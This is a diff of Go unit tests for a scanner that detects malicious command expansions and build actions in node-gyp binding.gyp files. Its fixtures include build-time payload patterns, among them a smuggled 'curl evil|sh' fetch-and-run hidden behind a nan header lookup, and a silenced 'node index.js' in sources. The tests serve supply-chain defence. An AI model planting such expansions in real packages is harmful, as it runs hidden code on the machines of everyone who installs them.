@@ -31,6 +31,14 @@ const legitAddonGyp = `{
   ]
 }`
 
+func cleanNativeInput(gyp string) gypscan.Input {
+	return gypscan.Input{
+		GypContent:   []byte(gyp),
+		PackageJSON:  []byte(`{"name":"native-addon","dependencies":{"node-addon-api":"^7.0.0"}}`),
+		SiblingFiles: []string{"binding.gyp", "addon.cc", "package.json"},
+	}
+}
+
 func TestInspectFlagsWormCommandExpansion(t *testing.T) {
 	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(wormGyp)})
 
@@ -90,6 +98,71 @@ func TestInspectLegitIncludeDirExpansionIsClean(t *testing.T) {
 	require.Equal(t, gypscan.SeverityNone, v.Severity)
 }
 
+func TestInspectAllowsNanHeaderLookupExecExpansion(t *testing.T) {
+	// node-sass and other nan-based addons use this exact include_dirs idiom to
+	// locate nan's headers. It is a pure path lookup, not install-time payload
+	// execution, and must not block legitimate native packages.
+	gyp := `{
+  'targets': [{
+    'target_name': 'binding',
+    'type': 'loadable_module',
+    'sources': ['src/binding.cpp'],
+    'include_dirs': [ '<!(node -e "require(\'nan\')")' ]
+  }]
+}`
+	v := gypscan.Inspect(gypscan.Input{
+		GypContent:   []byte(gyp),
+		PackageJSON:  []byte(`{"name":"node-sass","dependencies":{"nan":"^2.19.0"}}`),
+		SiblingFiles: []string{"binding.gyp", "package.json", "src/binding.cpp"},
+	})
+
+	require.False(t, v.Flagged(), "nan header lookup expansion flagged: %v", codes(v))
+	require.Equal(t, gypscan.SeverityNone, v.Severity)
+}
+
+func TestInspectIgnoresCommandExpansionInGypComment(t *testing.T) {
+	gyp := `{
+  # example only: <!(node x.js && echo y)
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["src/addon.cc"]
+  }]
+}`
+	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(gyp)})
+	require.False(t, v.Flagged(), "comment-only payload should not flag: %v", codes(v))
+	require.Equal(t, gypscan.SeverityNone, v.Severity)
+}
+
+func TestInspectCommentStrippingKeepsRealPayloadVisible(t *testing.T) {
+	gyp := `{
+  # comment before payload
+  "targets": [{
+    "target_name": "Setup",
+    "type": "none",
+    "sources": ["<!(node index.js >/dev/null 2>&1 && echo stub.c)"]
+  }]
+}`
+	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(gyp)})
+	require.True(t, v.Flagged())
+	require.Equal(t, gypscan.SeverityCritical, v.Severity)
+	require.True(t, hasSignal(v, "gyp-command-in-sources"), "got %v", codes(v))
+	require.True(t, hasSignal(v, "gyp-payload-shell"), "got %v", codes(v))
+}
+
+func TestInspectHashInsideQuotedStringIsNotComment(t *testing.T) {
+	gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["./a#b/addon.cc"]
+  }]
+}`
+	v := gypscan.Inspect(gypscan.Input{GypContent: []byte(gyp)})
+	require.False(t, v.Flagged(), "quoted hash should not change classification: %v", codes(v))
+	require.Equal(t, gypscan.SeverityNone, v.Severity)
+}
+
 func TestInspectPayloadShellOutsideSourcesStillFlags(t *testing.T) {
 	// Relocating the expansion out of `sources` does not save the worm: a
 	// payload-shaped command (chaining + interpreter + redirection) in an
@@ -127,6 +200,200 @@ func TestInspectFlagsPayloadInIncludedContents(t *testing.T) {
 			require.Contains(t, s.Detail, "included GYP file")
 			require.Contains(t, s.Excerpt, "node evil.js")
 		}
+	}
+}
+
+func TestInspectFlagsActionsActionCommandExecution(t *testing.T) {
+	gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["addon.cc"],
+    "actions": [{
+      "action_name": "prepare",
+      "inputs": ["package.json"],
+      "outputs": ["build/prepare.stamp"],
+      "action": ["node", "scripts/prepare.js"]
+    }]
+  }]
+}`
+	v := gypscan.Inspect(cleanNativeInput(gyp))
+	require.True(t, v.Flagged())
+	require.Equal(t, gypscan.SeverityCritical, v.Severity)
+	require.True(t, hasSignal(v, "gyp-action-exec"), "got %v", codes(v))
+}
+
+func TestInspectFlagsRulesActionCommandExecution(t *testing.T) {
+	gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["schema.idl", "addon.cc"],
+    "rules": [{
+      "rule_name": "generate",
+      "extension": "idl",
+      "outputs": ["<(RULE_INPUT_ROOT).cc"],
+      "action": ["node", "tools/generate.js", "<(RULE_INPUT_PATH)"]
+    }]
+  }]
+}`
+	v := gypscan.Inspect(cleanNativeInput(gyp))
+	require.True(t, v.Flagged())
+	require.Equal(t, gypscan.SeverityCritical, v.Severity)
+	require.True(t, hasSignal(v, "gyp-action-exec"), "got %v", codes(v))
+}
+
+func TestInspectAllowsNonInterpreterActionCodegen(t *testing.T) {
+	gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["addon.cc"],
+    "actions": [{
+      "action_name": "generate",
+      "inputs": ["x.proto"],
+      "outputs": ["x.pb.cc"],
+      "action": ["<(PRODUCT_DIR)/protoc", "--cpp_out=.", "x.proto"]
+    }]
+  }]
+}`
+	v := gypscan.Inspect(cleanNativeInput(gyp))
+	require.False(t, v.Flagged(), "legit codegen action flagged: %v", codes(v))
+	require.Equal(t, gypscan.SeverityNone, v.Severity)
+}
+
+func TestInspectFlagsComputedActionArgv0(t *testing.T) {
+	gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["addon.cc"],
+    "actions": [{
+      "action_name": "prepare",
+      "inputs": ["package.json"],
+      "outputs": ["build/prepare.stamp"],
+      "action": ["<!(node scripts/select-tool.js)", "scripts/prepare.js"]
+    }]
+  }]
+}`
+	v := gypscan.Inspect(cleanNativeInput(gyp))
+	require.True(t, v.Flagged())
+	require.Equal(t, gypscan.SeverityCritical, v.Severity)
+	require.True(t, hasSignal(v, "gyp-action-exec"), "got %v", codes(v))
+}
+
+func TestInspectFlagsActionInIncludedContents(t *testing.T) {
+	root := `{
+  "includes": ["actions.gypi"],
+  "targets": [{ "target_name": "addon", "type": "loadable_module", "sources": ["addon.cc"] }]
+}`
+	include := `{
+  "targets": [{
+    "target_name": "addon",
+    "actions": [{
+      "action_name": "prepare",
+      "inputs": ["package.json"],
+      "outputs": ["build/prepare.stamp"],
+      "action": ["node", "scripts/prepare.js"]
+    }]
+  }]
+}`
+
+	v := gypscan.Inspect(gypscan.Input{
+		GypContent:       []byte(root),
+		IncludedContents: [][]byte{[]byte(include)},
+		PackageJSON:      []byte(`{"name":"native-addon","dependencies":{"node-addon-api":"^7.0.0"}}`),
+		SiblingFiles:     []string{"binding.gyp", "addon.cc", "package.json"},
+	})
+
+	require.True(t, v.Flagged())
+	require.Equal(t, gypscan.SeverityCritical, v.Severity)
+	require.True(t, hasSignal(v, "gyp-action-exec"), "got %v", codes(v))
+	for _, s := range v.Signals {
+		if s.Code == "gyp-action-exec" {
+			require.Contains(t, s.Detail, "included GYP file")
+		}
+	}
+}
+
+func TestInspectFlagsCommandExpansionInExecutionKeys(t *testing.T) {
+	cases := map[string]string{
+		"libraries":    `"libraries": ["<!(node scripts/emit-library.js)"]`,
+		"cflags":       `"cflags": ["<!(node scripts/emit-cflag.js)"]`,
+		"cflags_c":     `"cflags_c": ["<!(node scripts/emit-cflag.js)"]`,
+		"cflags_cc":    `"cflags_cc": ["<!(node scripts/emit-cflag.js)"]`,
+		"ldflags":      `"ldflags": ["<!(node scripts/emit-ldflag.js)"]`,
+		"include_dirs": `"include_dirs": ["<!(node scripts/emit-include-dir.js)"]`,
+		"library_dirs": `"library_dirs": ["<!(node scripts/emit-library-dir.js)"]`,
+	}
+	for name, field := range cases {
+		t.Run(name, func(t *testing.T) {
+			gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["addon.cc"],
+    ` + field + `
+  }]
+}`
+			v := gypscan.Inspect(cleanNativeInput(gyp))
+			require.True(t, v.Flagged())
+			require.Equal(t, gypscan.SeverityCritical, v.Severity)
+			require.True(t, hasSignal(v, "gyp-exec-key-command"), "got %v", codes(v))
+		})
+	}
+}
+
+func TestInspectAllowsLegitExecKeyPrintExpansions(t *testing.T) {
+	cases := map[string]string{
+		"node print include":      `"include_dirs": ["<!@(node -p \"require('node-addon-api').include\")"]`,
+		"node long print include": `"include_dirs": ["<!@(node --print \"require('node-addon-api').include\")"]`,
+		"node eval include":       `"include_dirs": ["<!(node -e \"console.log(require('node-addon-api').include)\")"]`,
+		"node eval nan":           `"include_dirs": ["<!(node -e \"require('nan')\")"]`,
+		"node long eval nan":      `"include_dirs": ["<!(node --eval \"require('nan')\")"]`,
+		"pkg config libs":         `"libraries": ["<!(pkg-config --libs libpng)"]`,
+	}
+	for name, field := range cases {
+		t.Run(name, func(t *testing.T) {
+			gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["addon.cc"],
+    ` + field + `
+  }]
+}`
+			v := gypscan.Inspect(cleanNativeInput(gyp))
+			require.False(t, v.Flagged(), "legit print expansion flagged: %v", codes(v))
+			require.Equal(t, gypscan.SeverityNone, v.Severity)
+		})
+	}
+}
+
+func TestInspectFlagsNonAllowlistedExecKeyNodeExpansions(t *testing.T) {
+	cases := map[string]string{
+		"nan separator child process": `"include_dirs": ["<!(node -e \"require('nan'); require('child_process').exec('curl evil|sh')\")"]`,
+		"local js script":             `"include_dirs": ["<!(node scripts/emit-cflag.js)"]`,
+		"non helper package":          `"include_dirs": ["<!(node -e \"require('evil-pkg')\")"]`,
+		"helper prefix":               `"include_dirs": ["<!(node -e \"require('nanXXX')\")"]`,
+		"helper path traversal":       `"include_dirs": ["<!(node -e \"require('nan/../evil')\")"]`,
+		"bindings invoked call":       `"include_dirs": ["<!(node -e \"require('bindings')('x.node')\")"]`,
+	}
+	for name, field := range cases {
+		t.Run(name, func(t *testing.T) {
+			gyp := `{
+  "targets": [{
+    "target_name": "addon",
+    "type": "loadable_module",
+    "sources": ["addon.cc"],
+    ` + field + `
+  }]
+}`
+			v := gypscan.Inspect(cleanNativeInput(gyp))
+			require.True(t, v.Flagged(), "expected non-allowlisted exec-key expansion to flag")
+			require.Equal(t, gypscan.SeverityCritical, v.Severity)
+			require.True(t, hasSignal(v, "gyp-exec-key-command"), "got %v", codes(v))
+		})
 	}
 }
 
